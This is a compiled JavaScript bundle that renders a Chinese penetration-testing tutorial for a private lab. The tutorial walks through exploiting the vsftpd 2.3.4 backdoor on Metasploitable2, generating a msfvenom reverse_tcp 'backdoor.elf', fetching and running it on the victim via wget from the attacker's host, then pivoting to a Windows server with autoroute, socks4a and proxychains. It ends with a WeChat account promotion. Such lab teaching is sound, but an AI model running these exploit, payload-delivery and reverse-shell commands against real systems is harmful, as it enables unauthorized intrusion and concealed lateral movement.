(window.webpackJsonp=window.webpackJsonp||[]).push([[252],{536:function(a,s,t){"use strict";t.r(s);var e=t(6),r=Object(e.a)({},(function(){var a=this,s=a._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[s("h1",{attrs:{id:"meterpreter以被控制的计算机为跳板渗透其他服务器"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#meterpreter以被控制的计算机为跳板渗透其他服务器"}},[a._v("#")]),a._v(" Meterpreter以被控制的计算机为跳板渗透其他服务器")]),a._v(" "),s("p",[a._v("攻击机：Kali 192.168.75.10")]),a._v(" "),s("p",[a._v("跳板： Metasploitable2 192.168.75.130")]),a._v(" "),s("p",[a._v("目标机： Windows Server 2012 192.168.75.140")]),a._v(" "),s("p",[a._v("这里无法通过Kali(192.168.75.10)主机直接访问目标机(192.168.75.140)，目标机只能通过跳板(192.168.75.130)访问，这里Kali(192.168.75.10)已经成功渗透跳板(192.168.75.130)主机，需要将已渗透主机(192.168.75.130)设置为跳板来访问目标机(192.168.75.140)。")]),a._v(" "),s("p",[a._v("如果直接通过攻击机(192.168.75.10)访问目标机(192.168.75.140),会出现如下错误：")]),a._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190114124851544.png",loading:"lazy"}})]),a._v(" "),s("p",[a._v("这里，跳板(192.168.75.130)拥有连接目标机(192.168.75.140)权限。因此需要一些方法将我们对目标机(192.168.75.140)发起的请求通过跳板(192.168.75.130)转发出去，需要的这种技术方法就是跳板技术。")]),a._v(" "),s("p",[a._v("这里，我们首先要渗透跳板(192.168.75.130)主机。具体步骤如下：")]),a._v(" "),s("p",[a._v("开启MSF")]),a._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[a._v("msfconsole\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("h2",{attrs:{id:"扫描指定主机的服务和端口"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#扫描指定主机的服务和端口"}},[a._v("#")]),a._v(" 扫描指定主机的服务和端口")]),a._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[a._v("nmap -sV -p 21,22,25,80,110,443,445 192.168.75.130\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[a._v("如果要存入MSF的数据库，则：")]),a._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[a._v("db_nmap -sV -p 21,22,25,80,110,443,445 192.168.75.130\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("h2",{attrs:{id:"列出在目标端口上运行的服务"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#列出在目标端口上运行的服务"}},[a._v("#")]),a._v(" 列出在目标端口上运行的服务")]),a._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[a._v("services\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("h2",{attrs:{id:"过滤服务-只显示开启的服务"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#过滤服务-只显示开启的服务"}},[a._v("#")]),a._v(" 过滤服务，只显示开启的服务")]),a._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[a._v("services -u\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("h2",{attrs:{id:"列出数据库中所有的主机"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#列出数据库中所有的主机"}},[a._v("#")]),a._v(" 列出数据库中所有的主机")]),a._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[a._v("hosts\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("h2",{attrs:{id:"漏洞攻击"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞攻击"}},[a._v("#")]),a._v(" 漏洞攻击")]),a._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[a._v("use exploit/unix/ftp/vsftpd_234_backdoor\nshow options\nset RHOST 192.168.75.130\nset RPORT 21\nshow payloads\nset payload cmd/unix/interact\nexploit\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br"),s("span",{staticClass:"line-number"},[a._v("3")]),s("br"),s("span",{staticClass:"line-number"},[a._v("4")]),s("br"),s("span",{staticClass:"line-number"},[a._v("5")]),s("br"),s("span",{staticClass:"line-number"},[a._v("6")]),s("br"),s("span",{staticClass:"line-number"},[a._v("7")]),s("br")])]),s("p",[a._v("注：所有操作都是在MSF终端下")]),a._v(" "),s("p",[s("strong",[a._v("这里，我们继续将Shell控制升级为Meterpreter命令行。")])]),a._v(" "),s("p",[a._v("在攻击机Kali上重新开启一个终端：")]),a._v(" "),s("h2",{attrs:{id:"生成反弹木马"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#生成反弹木马"}},[a._v("#")]),a._v(" 生成反弹木马")]),a._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[a._v("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST 192.168.75.10 LPORT 4444 -f elf > backdoor.elf\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[a._v("注：elf是Linux系统下的默认扩展名")]),a._v(" "),s("h2",{attrs:{id:"启动kali上的apache服务-并将backdoor-elf放置到服务器中"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#启动kali上的apache服务-并将backdoor-elf放置到服务器中"}},[a._v("#")]),a._v(" 启动Kali上的Apache服务，并将backdoor.elf放置到服务器中")]),a._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[a._v("service apache2 start\nmv backdoor.elf /var/www/html/\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br")])]),s("p",[a._v("这样，就可以让目标系统从我们的计算机中下载这个木马文件了。")]),a._v(" "),s("h2",{attrs:{id:"在目标机上下载木马文件"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#在目标机上下载木马文件"}},[a._v("#")]),a._v(" 在目标机上下载木马文件")]),a._v(" "),s("p",[a._v("切换到第6步的终端，执行命令：")]),a._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[a._v("wget http://192.168.75.10/backdoor.elf\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[a._v("即将木马文件下载到了目标机上")]),a._v(" "),s("h2",{attrs:{id:"在新开启的终端上执行如下命令"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#在新开启的终端上执行如下命令"}},[a._v("#")]),a._v(" 在新开启的终端上执行如下命令")]),a._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[a._v("msfconsole\nuse exploit/multi/handler\nset payload linux/x86/meterpreter/reverse_tcp\nset LHOST 192.168.75.10\nset LPORT 4444\nexploit\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br"),s("span",{staticClass:"line-number"},[a._v("3")]),s("br"),s("span",{staticClass:"line-number"},[a._v("4")]),s("br"),s("span",{staticClass:"line-number"},[a._v("5")]),s("br"),s("span",{staticClass:"line-number"},[a._v("6")]),s("br")])]),s("h2",{attrs:{id:"在目标机上运行木马文件"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#在目标机上运行木马文件"}},[a._v("#")]),a._v(" 在目标机上运行木马文件")]),a._v(" "),s("p",[a._v("切换到第6步的终端，执行命令：")]),a._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[a._v("chmod 7777 backdoor.elf\n./backdoor.elf\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br")])]),s("h2",{attrs:{id:"查看反弹的meterpreter终端"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#查看反弹的meterpreter终端"}},[a._v("#")]),a._v(" 查看反弹的Meterpreter终端")]),a._v(" "),s("p",[a._v("回到新开启的终端上查看，此时，我们看到已经反弹回Meterpreter命令行了。")]),a._v(" "),s("p",[a._v("接下来，就可以在Meterpreter终端进行操作了。")]),a._v(" "),s("p",[a._v("下面，我们需要执行autoroute脚本，并使用-s将脚本的参数设定为目标主机(192.168.75.140)的IP地址，这样我们就可以在已经被我们渗透的跳板机(192.168.75.130)上添加一条到达目标主机(192.168.75.140)的路由。")]),a._v(" "),s("h2",{attrs:{id:"添加路由"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#添加路由"}},[a._v("#")]),a._v(" 添加路由")]),a._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[a._v("run autoroute -p\nrun autoroute -s 192.168.75.140\nrun autoroute -p\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br"),s("span",{staticClass:"line-number"},[a._v("3")]),s("br")])]),s("p",[a._v("以攻击者(192.168.75.10)的角度看，现在需要启动一个可以将请求通过Meterpreter发送给目标的模块。可以选择auxiliary/server/socks4a这个模块。")]),a._v(" "),s("h2",{attrs:{id:"启动监听"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#启动监听"}},[a._v("#")]),a._v(" 启动监听")]),a._v(" "),s("p",[a._v("在攻击机(192.168.75.10)上执行如下命令：")]),a._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[a._v("use auxiliary/server/socks4a\nshow options\nset SRVHOST 127.0.0.1\nset SRVPORT 1080\nrun\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br"),s("span",{staticClass:"line-number"},[a._v("3")]),s("br"),s("span",{staticClass:"line-number"},[a._v("4")]),s("br"),s("span",{staticClass:"line-number"},[a._v("5")]),s("br")])]),s("h2",{attrs:{id:"配置攻击机-192-168-75-10-etc-proxychains-conf"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#配置攻击机-192-168-75-10-etc-proxychains-conf"}},[a._v("#")]),a._v(" 配置攻击机(192.168.75.10)/etc/proxychains.conf")]),a._v(" "),s("p",[a._v("添加下面一行配置：")]),a._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[a._v("socks4 127.0.0.1 1080\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190114125602716.png",loading:"lazy"}})]),a._v(" "),s("h2",{attrs:{id:"配置forefox代理"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#配置forefox代理"}},[a._v("#")]),a._v(" 配置Forefox代理")]),a._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190114125618848.png",loading:"lazy"}})]),a._v(" "),s("p",[a._v("再一次打开目标服务器(192.168.75.140)的限制目录下的网页。")]),a._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190114125638407.png",loading:"lazy"}})]),a._v(" "),s("p",[a._v("这里，我们就可以访问了。")]),a._v(" "),s("p",[a._v("接下来，我们访问下目标服务器(192.168.75.140)服务器的IP记录器，如下：")]),a._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190114125656890.png",loading:"lazy"}})]),a._v(" "),s("p",[a._v("可以看到是跳板(192.168.75.130)的IP地址，不管我们对目标服务器(192.168.75.140)做了什么，对目标服务器(192.168.75.140)眼中这一切都是跳板机(192.168.75.130)做的。然而，我们的真实IP确是192.168.75.10。")]),a._v(" "),s("h1",{attrs:{id:"写在最后"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[a._v("#")]),a._v(" 写在最后")]),a._v(" "),s("blockquote",[s("p",[a._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),s("strong",[a._v("冰河技术")]),a._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),s("strong",[a._v("冰河技术")]),a._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),s("strong",[a._v("冰河技术")]),a._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),s("strong",[a._v("冰河技术")]),a._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),a._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);s.default=r.exports}}]);